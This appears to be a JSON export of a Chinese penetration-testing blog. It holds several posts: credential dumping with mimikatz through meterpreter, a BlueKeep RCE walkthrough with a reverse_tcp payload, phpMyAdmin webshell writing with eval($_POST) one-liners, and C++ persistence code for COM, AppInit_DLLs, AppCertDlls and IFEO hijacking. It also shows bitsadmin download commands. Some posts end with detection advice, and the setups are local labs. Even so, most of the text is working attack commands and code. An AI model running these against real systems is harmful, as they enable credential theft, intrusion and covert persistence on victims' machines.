print(testVuln)鸣谢POC多数来源于[AngelSword]部分为自己编写，欢迎投递POC邮箱地址：qianxiao996@126.com警告！请勿用于非法用途！否则自行承担一切后果","categories":[{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"渗透工具","slug":"渗透工具","permalink":"http://blog.qianxiao996.cn/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"}]},{"title":"meterpreter中使用mimikatz获取windows密码","slug":"meterpreter中使用mimikatz获取windows密码","date":"2019-09-12T08:31:55.000Z","updated":"2020-07-05T04:08:44.449Z","comments":true,"path":"2019/09/12/meterpreter中使用mimikatz获取windows密码/","link":"","permalink":"http://blog.qianxiao996.cn/2019/09/12/meterpreter%E4%B8%AD%E4%BD%BF%E7%94%A8mimikatz%E8%8E%B7%E5%8F%96windows%E5%AF%86%E7%A0%81/","excerpt":"","text":"进去meterpreter后getuid一下这获得系统管理员权限开始加载mimikatz模块1load mimikatz加载成功.第一种方法：获取登录密码的hash值1msv]上面已经是得到hash值了. 下面算明文密码.获取明文密码1kerberoslook…拿到登录的明文密码了.第二种方法：使用另一种方式获取哈希值1mimikatz_command -f samdump::hashes根据上面的方式获取明文密码1mimikatz_command -f sekurlsa::searchPasswords第三种方法：Wdigest命令这个命令呢, 没有上面的复杂,加载模块后直接调用这个wdigest.1wdigest第四种方法：tspkg命令1tspkg总结1234567891011121314151617一、load mimikatz #加载mimikatzmsv #获取hash值kerberos #获取明文二、load mimikatz #加载mimikatzwdigest #获取系统账户信息三、load mimikatz #加载mimikatztspkg #获取系统账户信息四、load mimikatz #加载mimikatzmimikatz_command -f samdump::hashesmimikatz_command -f sekurlsa::searchPasswords","categories":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"MSF","slug":"MSF","permalink":"http://blog.qianxiao996.cn/tags/MSF/"}]},{"title":"CVE-2019-0708 RCE复现","slug":"CVE-2019-0708-RCE复现","date":"2019-09-07T02:30:15.000Z","updated":"2020-07-04T11:21:35.006Z","comments":true,"path":"2019/09/07/CVE-2019-0708-RCE复现/","link":"","permalink":"http://blog.qianxiao996.cn/2019/09/07/CVE-2019-0708-RCE%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"漏洞环境192.168.91.136 windows7 6.1.7601192.168.91.151 kaliWindows7 SP1下载链接:ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/复现过程1、首先升级MSF12apt-get updateapt-get install metasploit-framework2、导入脚本然后下载RCE脚本，直接将下载下载的脚本放到对应的目录下1234rdp.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;lib&#x2F;msf&#x2F;core&#x2F;exploit&#x2F;rdp.rb rdp_scanner.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner.rb cve_2019_0708_bluekeep.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;auxiliary&#x2F;scanner&#x2F;rdp&#x2F;cve_2019_0708_bluekeep.rb cve_2019_0708_bluekeep_rce.rb -&gt; &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;modules&#x2F;exploits&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce.rb下载地址：https://github.com/NAXG/cve_2019_0708_bluekeep_rce3、重新加载脚本12msfconsole reload_all4、攻击使用set RHOSTS 受害机IP设置受害机IP使用set RPORT 受害机PORT设置受害机RDP端口号使用set target ID数字(可选为0-4)设置受害机机器架构lhost一般不用设置，payload一定要设置123456use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce set lhost 192.168.91.151 set rhost 192.168.91.136 set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp set target 1 run目前这个exp仅适用于 windows7 6.1.7601 windows 2008r2END","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://blog.qianxiao996.cn/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"CVE漏洞","slug":"CVE漏洞","permalink":"http://blog.qianxiao996.cn/tags/CVE%E6%BC%8F%E6%B4%9E/"}]},{"title":"PhpMyadmin后台拿webshell方法总结","slug":"PhpMyadmin后台拿webshell方法总结","date":"2019-09-05T09:01:35.000Z","updated":"2020-07-05T04:07:10.107Z","comments":true,"path":"2019/09/05/PhpMyadmin后台拿webshell方法总结/","link":"","permalink":"http://blog.qianxiao996.cn/2019/09/05/PhpMyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFwebshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言：phpmyadmin后台拿webshell的方法主要分为两个方法：(1) 、通过日志文件拿webshell;(2) 、利用日志文件写入一句话;(这个方法可能在实际操作中会遇到困难)；本地搭建环境：Phpmystudy 2018PHP–5.5.38一、日志文件写入一句话来获取webshell：(1) 、首先我们先利用日志文件写入一句话来获取webshell，日志文件写入的思路利用mysql的一个日志文件。我们执行的每一个sql语句都会被保存到日志中，换个思路想一下把这个日志文件重名为.php,然后我们在执行一次sql语句，那么就会被保存在这个.php文件中，这样我们就能顺利拿到webshell。(2) 、假如通过某个方法获取到phpmyadmin的登陆后台且账号密码是弱口令：（3）、点击变量选项，搜索gen就会出来general.log和general log file这两个变量，general.log变量是指是否启动记录日志；而general log file指的是日志文件的路径，可以看到general.log变量的状态为OFF，故我们要修改为ON；general log file变量中的.log的后缀我们改为php。拿完webshell记得要改回去哟。SQL语句进行修改：12SET global general_log &#x3D; &quot;ON&quot;; 日志保存状态开启；SET global general_log_file&#x3D;&#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;; 修改日志的保存位置。（具体路径还需在实际环境中改变）；修改后的配置（4）保存后，我们在SQL查询的框中写入123select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;或着 SELECT &#39;&lt;?phpassert($_POST[&quot;cmd&quot;]);?&gt;&#39;;执行完毕后就会出现这个界面，这样的话我们就成功的把一句话写入到日志文件中：（5）、查看网站目录下生成了一个shell.php的文件，一句话木马已经被我们写入，看到这里大家可能会问为什么里面不是纯净的一句话木马？我也百思不得其解，百度了一下发现是我们是上传的php一句话木马，在连接过程中，它是从头开始读取的，因为前面的不具备php文件的特征：（6）、浏览器测试用菜刀直接连接木马地址，webshell成功拿到：http://127.0.0.1/shell.phpwebshell已经拿到二、利用插入一句话来提取webshell:1、在知道路径的前提下插入一句话，我们在插入一句话木马的时候首先要检测插入的条件是否被允许，输入查询语句1show global variables like &#39;%secure%&#39;;显示是NULL值，这样的情况下我们插入一句话是无法插入的，需要我们修改secure_file_priv=’’为空值才能插入一句话：解释一下：secure_file_priv为null 表示不允许导入导出；secure_file_priv指定文件夹时，表示mysql的导入导出只能在指定的文件夹；secure_file_priv没有设置时，则表示没有任何限制；当secure_file_priv为null 时，执行插入语句，发现无法插入一句话木马：1select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;意思是Mysql服务器运行“–secure-file-priv”选项，所以不能执行这个语句。如果要解决这个问题，我们可以通过下面2种方式：将你要导入或导出的文件位置指定到你设置的路径里；由于不能在网页上修改，所以我们只能修改my.cnf里关于这个选项的配置，然后重启即可。（windwos下my.cnf叫my.ini）我的在E:\\phpStudy\\PHPTutorial\\MySQL路径下把–secure-file-priv修改为’’ 没有这个则添加。（1）、当我们把上面的障碍扫平之后，接下来就比较简单，我们可以这样写：1select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;意思就是在目录下会生成一个shell.php的文件，我们用菜刀直接连接这个文件地址就可以直接拿到webshell：（2）、我们用菜刀直接连接http://127.0.0.1/shell.php就可以成功拿到服务器webshell：2、在不知道绝对路径的前提下拿webshell：这个方法几乎和我们做灰盒测试差不多，只拿到了登陆后台，但是不知道网站的绝对路径，这就非常尴尬，下面我总结了一下几点可以成功爆出网站的根路径：（1）、SQL查询框中输入select @@basedir;就可以成功的输出绝对路径，这是利用了mysql的特性；（这个比较常用，毕竟是mysql的特性）select @@basedir;（2）、直接在url后面输入phpinfo.php,看看能不能读出这个文件，如果存在就会把网站的绝对路径显示出来，这样的情况特少，因为网站管理人员不可能把这个测试页面在互联网上面直接显示出来，他们或许会更改路径或许会设置目录访问权限；（3）、使用扫描工具对网站进行扫扫描；扫描一些phpinfo.php info.php php.php test.php等等；（4）、phpmyadmin读取 iis6，iis7配置文件 读取apache Nginx 配置文件！windows2003 iis6配置文件所在位置 C:\\Windows/system32\\inetsrv\\metabase.xmlwin2008/2012 iis7.5 在这个文件 C:\\Windows\\System32\\inetsrv\\config\\applicationHost.configNginx配置 /etc/nginx/conf.d/vhost.conf /etc/nginx/nginx.confapache配置 /etc/httpd/conf/httpd.conf /usr/local/apache2/conf/httpd.conf总结1、利用日志写shell123SET global general_log &#x3D; &quot;ON&quot;; 日志保存状态开启；SET global general_log_file&#x3D;&#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;; 修改日志保存的位置SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;2、利用 select XXX into outfile 绝对路径写shell（需要secure_file_priv=’’）1select &#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;INTO OUTFILE &#39;E:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;shell.php&#39;;3、查找绝对路径1select @@basedir;","categories":[{"name":"渗透技巧","slug":"渗透技巧","permalink":"http://blog.qianxiao996.cn/categories/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7/"}],"tags":[{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://blog.qianxiao996.cn/tags/phpmyadmin/"}]},{"title":"后门及持久化访问4----Com组件劫持","slug":"后门及持久化访问4-Com组件劫持","date":"2019-08-23T02:30:15.000Z","updated":"2020-07-04T11:15:30.908Z","comments":true,"path":"2019/08/23/后门及持久化访问4-Com组件劫持/","link":"","permalink":"http://blog.qianxiao996.cn/2019/08/23/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE4-Com%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81/","excerpt":"","text":"代码及原理介绍​ COM是Component Object Model（组件对象模型）的缩写，COM组件由DLL和EXE形式发布的可执行代码所组成。每个COM组件都有一个CLSID，这个CLSID是注册的时候写进注册表的，可以把这个CLSID理解为这个组件最终可以实例化的子类的一个ID。这样就可以通过查询注册表中的CLSID来找到COM组件所在的dll的名称。所以要想COM劫持，必须精心挑选CLSID，尽量选择应用范围广的CLSID。这里，我们选择的CLSID为：{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}，来实现对CAccPropServicesClass 和 MMDeviceEnumerator的劫持。系统很多正常程序启动时需要调用这两个实例。例如计算器。Dll存放的位置：//%APPDATA%Microsoft/Installer/{BCDE0395-E52F-467C-8E3D-C4579291692E}接下来就是修改注册表，在指定路径添加文件，具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;Windows.h&gt; #include &lt;string&gt;using namespace std;int main(int argc, char* argv[])&#123; string type&#x3D;argv[1]; if (argc &gt; 1) &#123; HKEY hKey; DWORD dwDisposition; &#x2F;&#x2F;%APPDATA%Microsoft&#x2F;Installer&#x2F;&#123;BCDE0395-E52F-467C-8E3D-C45792916&#x2F;&#x2F;92E&#125; char system1[] &#x3D; &quot;C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Installer\\\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\\\\qianxiao996.dll&quot;; char system2[] &#x3D; &quot;Apartment&quot;; string defaultPath &#x3D; &quot;C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Installer\\\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;&quot;; string szSaveName &#x3D; &quot;C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Installer\\\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\\\\qianxiao996.dll&quot;; if (&quot;-go&quot; &#x3D;&#x3D; type) &#123; &#x2F;&#x2F;string folderPath &#x3D; defaultPath + &quot;\\\\testFolder&quot;; string command; command &#x3D; &quot;mkdir -p &quot; + defaultPath; if (ERROR_SUCCESS !&#x3D; RegCreateKeyExA(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\CLSID\\\\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\\\\InprocServer32&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition)) &#123; printf(&quot;创建注册表失败！&quot;); return 0; &#125; if (ERROR_SUCCESS !&#x3D; RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)system1, (1 + ::lstrlenA(system1)))) &#123; printf(&quot;设置DLL文件失败！&quot;); return 0; &#125; if (ERROR_SUCCESS !&#x3D; RegSetValueExA(hKey, &quot;ThreadingModel&quot;, 0, REG_SZ, (BYTE*)system2, (1 + ::lstrlenA(system2)))) &#123; printf(&quot;设置ThreadingModel失败！&quot;); return 0; &#125; ::MessageBoxA(NULL, &quot;comHijacking OK!&quot;, &quot;OK&quot;, MB_OK); &#125; if (&quot;-down&quot; &#x3D;&#x3D; type) &#123; if (ERROR_SUCCESS !&#x3D; RegCreateKeyExA(HKEY_CURRENT_USER, &quot;Software\\\\Classes\\\\CLSID\\\\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\\\\InprocServer32&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition)) &#123; printf(&quot;创建注册表失败！&quot;); return 0; &#125; if (ERROR_SUCCESS !&#x3D; RegDeleteValueA(hKey, NULL)) &#123; printf(&quot;移除DLL文件失败！&quot;); return 0; &#125; if (ERROR_SUCCESS !&#x3D; RegDeleteValueA(hKey, &quot;ThreadingModel&quot;)) &#123; printf(&quot;移除ThreadingModel失败！&quot;); return 0; &#125; remove(szSaveName.c_str()); remove(defaultPath.c_str()); ::MessageBoxA(NULL, &quot;Delete comHijacking OK!&quot;, &quot;OK&quot;, MB_OK); &#125; &#125; &#x2F;&#x2F;system(&quot;pause&quot;); else &#123; printf(&quot;Usage:\\n comHijacking.exe -go 进行COM劫持\\n comHijacking.exe -down 移除COM劫持&quot;); &#125; return 0;&#125;别问我为什么不写在两个函数里，因为我不会。DLL文件代码（这里的DLL代码就是用的上次的那个DLL文件）12345678910111213141516171819&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;stdafx.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0); switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;运行效果图运行生成的EXE文件（管理员运行），注意-go是安装劫持，-down是移除劫持.运行后，会生成以下目录：1C:\\\\Users\\\\admin\\\\AppData\\\\Roaming\\\\Microsoft\\\\Installer\\\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;然后将自己写好的DLL文件放入当前目录中会生成以下注册表项运行计算器，调用qianxiao996.dll 弹出对话框：移除COM劫持检查及清除方法由于COM对象是操作系统和已安装软件的合法部分，因此直接阻止对COM对象的更改可能会对正常的功能产生副作用。相比之下，使用白名单识别潜在的病毒会更有效。现有COM对象的注册表项可能很少发生更改。当具有已知路径和二进制的条目被替换或更改为异常值以指向新位置中的未知二进制时，它可能是可疑的行为，应该进行调查。同样，如果收集和分析程序DLL加载，任何与COM对象注册表修改相关的异常DLL加载都可能表明已执行COM劫持。此文章修改于天融信阿尔法实验室 ATT&amp;CK之后门持久化（一）COM组件劫持","categories":[{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[]},{"title":"后门及持久化访问3----进程注入之AppInit_DLLs注册表项","slug":"后门及持久化访问3-进程注入之AppInit-DLLs注册表项","date":"2019-08-22T06:30:15.000Z","updated":"2020-07-04T11:13:15.438Z","comments":true,"path":"2019/08/22/后门及持久化访问3-进程注入之AppInit-DLLs注册表项/","link":"","permalink":"http://blog.qianxiao996.cn/2019/08/22/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE3-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8BAppInit-DLLs%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/","excerpt":"","text":"进程注入之AppInit_DLLs注册表项User32.dll被加载到进程时，会获取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() API加载用户DLL。只会影响加载了user32.dll的进程。1HKEY_LOCAL_MACHINE\\Software\\Microsoft\\WindowsNT\\CurrentVersion\\Window\\Appinit_Dlls代码如下：12345678910111213141516171819202122#include #include using namespace std;int test()&#123; HKEY hKey; DWORD dwDisposition; const char path[] &#x3D; &quot;C:\\\\dll.dll&quot;; DWORD dwData &#x3D; 1; RegCreateKeyExA(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition); RegSetValueExA(hKey, &quot;AppInit_DLLs&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))); RegSetValueExA(hKey, &quot;LoadAppInit_DLLs&quot;, 0, REG_DWORD, (BYTE*)&amp; dwData, sizeof(DWORD)); return 0;&#125;int main()&#123; test(); &#x2F;&#x2F;system(&quot;pause&quot;); return 0;&#125;复现过程将以上代码编译为exe文件，放到测试机运行会产生一下注册项修改过后如下图所示：dll代码如下：12345678910111213141516171819&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;stdafx.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0); switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;运行cmd.exe，就会发现cmd.exe已经加载指定dll，并弹框。此注册表项下的每个库都会加载到每个加载User32.dll的进程中。User32.dll是一个非常常见的库，用于存储对话框等图形元素。恶意软件可以在Appinit_Dlls注册表项下插入其恶意库的位置，以使另一个进程加载其库。因此，当恶意软件修改此子键时，大多数进程将加载恶意库。检查及清除方法监测加载User32.dll的进程的dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。监视AppInit_DLLs注册表值。监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[]},{"title":"bitsadmin windwos自带下载命令","slug":"bitsadmin-windwos自带下载命令","date":"2019-08-20T12:30:15.000Z","updated":"2020-07-04T11:10:53.930Z","comments":true,"path":"2019/08/20/bitsadmin-windwos自带下载命令/","link":"","permalink":"http://blog.qianxiao996.cn/2019/08/20/bitsadmin-windwos%E8%87%AA%E5%B8%A6%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4/","excerpt":"","text":"bitsadmin的四种下载文件的方法一、1bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\\1.txt二、1bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\\1.txt三、1bitsadmin &#x2F;transfer qianxiao996 http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\\1.txt四、123456789bitsadmin &#x2F;create qianxiao996bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;qianxiao996.cn&#x2F;1.txt c:\\1.txtbitsadmin &#x2F;resume qianxiao996bitsadmin &#x2F;info qianxiao996 &#x2F;verbosebitsadmin &#x2F;complete qianxiao996[danger]注意’C:\\1.txt’的’&#39;不能丢，要不然会提示参数错误！[/danger]","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://blog.qianxiao996.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"文件下载","slug":"文件下载","permalink":"http://blog.qianxiao996.cn/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"}]},{"title":"后门及持久化访问2----进程注入之AppCertDlls 注册表项","slug":"后门及持久化访问2-进程注入之AppCertDlls-注册表项","date":"2019-08-18T12:30:15.000Z","updated":"2020-07-04T11:09:27.842Z","comments":true,"path":"2019/08/18/后门及持久化访问2-进程注入之AppCertDlls-注册表项/","link":"","permalink":"http://blog.qianxiao996.cn/2019/08/18/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE2-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E4%B9%8BAppCertDlls-%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%A1%B9/","excerpt":"","text":"代码及原理介绍如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会获取HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SessionManager\\AppCertDlls注册表项，此项下的dll都会加载到此进程。Win7版本下没有“AppCertDlls”项，需自己创建。代码如下：1234567891011121314151617181920#include &lt;iostream&gt; #include &lt;Windows.h&gt; using namespace std;int test()&#123; DWORD dwDisposition; HKEY hKey; const char path[] &#x3D; &quot;C:\\\\dll.dll&quot;; RegCreateKeyExA(HKEY_LOCAL_MACHINE,&quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCertDlls&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition); RegSetValueExA(hKey, &quot;Default&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))); return 0;&#125;int main()&#123; test(); &#x2F;&#x2F;system(&quot;pause&quot;); return 0;&#125;Dll代码：12345678910111213141516171819202122232425262728&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;stdafx.h&quot;BOOL TestMutex()&#123; HANDLE hMutex &#x3D; CreateMutexA(NULL, false, &quot;myself&quot;); if (GetLastError() &#x3D;&#x3D; ERROR_ALREADY_EXISTS) &#123; CloseHandle(hMutex); return 0; &#125; return 1;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#x2F;&#x2F;进程创建执行 if (TestMutex() &#x3D;&#x3D; 0) return TRUE; MessageBoxA(0, &quot;hello qianxiao996&quot;, &quot;AppCert&quot;, 0); case DLL_THREAD_ATTACH: &#x2F;&#x2F;进&#x3D;线程创建执行 case DLL_THREAD_DETACH: &#x2F;&#x2F;进程结束执行 case DLL_PROCESS_DETACH: &#x2F;&#x2F;线程结束执行 break; &#125; return TRUE;&#125;复现过程首先将代码运行生成EXE和DLL，完整代码在上面，将DLL文件名改为dll.dll并放到相应路径。然后以管理员运行exe文件，发现已经创建注册表下面编写一个创建进程的测试程序来打开notepad.exe，代码如下1234567891011121314151617181920212223242526#include &lt;iostream&gt; #include &lt;Windows.h&gt; using namespace std;int main()&#123; STARTUPINFO startupInfo &#x3D; &#123; 0 &#125;; PROCESS_INFORMATION processInformation &#x3D; &#123; 0 &#125;; BOOL bSuccess &#x3D; CreateProcess(TEXT(&quot;C:\\Windows\\System32\\notepad.exe&quot;), NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &amp;startupInfo, &amp;processInformation); if (bSuccess) &#123; cout &lt;&lt; &quot;Process started.&quot; &lt;&lt; endl &lt;&lt; &quot;Process ID:\\t&quot; &lt;&lt; processInformation.dwProcessId &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;Cannot start process!&quot; &lt;&lt; endl &lt;&lt; &quot;Error code:\\t&quot; &lt;&lt; GetLastError() &lt;&lt; endl; &#125; return system(&quot;pause&quot;);&#125;当运行测试exe的时候创建了进程，便调用了dll.dll文件，弹出hello qianxiao996窗口。检查及清除方法监测dll的加载，特别是查找不是通常的dll，或者不是正常加载的dll。监视AppCertDLL注册表值监视和分析注册表编辑的API调用，如RegCreateKeyEx和RegSetValueEx。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"http://blog.qianxiao996.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[]},{"title":"后门及持久化访问1----辅助功能镜像劫持","slug":"后门及持久化访问1-辅助功能镜像劫持","date":"2019-08-15T02:30:15.000Z","updated":"2020-07-04T11:07:41.449Z","comments":true,"path":"2019/08/15/后门及持久化访问1-辅助功能镜像劫持/","link":"","permalink":"http://blog.qianxiao996.cn/2019/08/15/%E5%90%8E%E9%97%A8%E5%8F%8A%E6%8C%81%E4%B9%85%E5%8C%96%E8%AE%BF%E9%97%AE1-%E8%BE%85%E5%8A%A9%E5%8A%9F%E8%83%BD%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81/","excerpt":"","text":"代码及原理介绍为了使电脑更易于使用和访问，Windows添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。一些常见的辅助功能如：C:\\Windows\\System32\\sethc.exe 粘滞键 快捷键：按五次shift键C:\\Windows\\System32\\utilman.exe 设置中心 快捷键：Windows+U键在较早的Windows版本，只需要进行简单的二进制文件替换，比如，程序” C:\\Windows\\System32\\utilman.exe”可以替换为“cmd.exe”。对于在Windows Vista和Windows Server 2008及更高的版本中，替换的二进制文件受到了系统的保护，因此这里就需要另一项技术：映像劫持。映像劫持，也被称为“IFEO”（Image File Execution Options）。当目标程序被映像劫持时，双击目标程序，系统会转而运行劫持程序，并不会运行目标程序。许多病毒会利用这一点来抑制杀毒软件的运行，并运行自己的程序。造成映像劫持的罪魁祸首就是参数“Debugger”，它是IFEO里第一个被处理的参数，系统如果发现某个程序文件在IFEO列表中，它就会首先来读取Debugger参数，如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为Debugger参数里指定的程序文件名的参数发送过去。参数“Debugger”本来是为了让程序员能够通过双击程序文件直接进入调试器里调试自己的程序。现在却成了病毒的攻击手段。简单操作就是修改注册表，在“HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Option”中添加utilman.exe项，在此项中添加debugger键，键值为要启动的程序路径。注意：Windows NT 和WindowsNT不一样！！！！C++ 实现代码：1234567891011121314151617181920#include &lt;iostream&gt; #include &lt;Windows.h&gt; using namespace std;int test()&#123; DWORD dwDisposition; HKEY hKey; const char path[] &#x3D; &quot;C:\\\\hello.exe&quot;; RegCreateKeyExA(HKEY_LOCAL_MACHINE, &quot;Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\Utilman.exe&quot;, 0, NULL, 0, KEY_WRITE, NULL, &amp;hKey, &amp;dwDisposition); RegSetValueExA(hKey, &quot;Debugger&quot;, 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))); return 0;&#125;int main()&#123; test(); &#x2F;&#x2F;system(&quot;pause&quot;); return 0;&#125;当然，我们自己的程序要放到相应的路径。复现过程镜像劫持可由多种脚本进行完成，上面是利用C++的脚本，而下面则是reg注册表文件进行完成。另有其他方法，如：VBS等。注册表代码如下：123Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe] &quot;Debugger&quot;&#x3D;&quot;C:&#x2F;&#x2F;hello.exe&quot;这段代码就是截取windows+U快捷键来运行自己想要运行的程序。Utilman.exe可以替换为自己想要截取的软件，hello.exe则是自己想要运行的文件。首先将代码保存为reg文件，然后将hello.exe放入C盘根目录，以管理员身份运行注册表文件。运行完后会添加如下健和值在锁屏状态下效果图如下：本次复现在windows 7 sp1环境下进行，其他系统请自行测试。经测试，windows 10 1809已经不能实现。检查及清除方法检查“HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ImageFile Execution 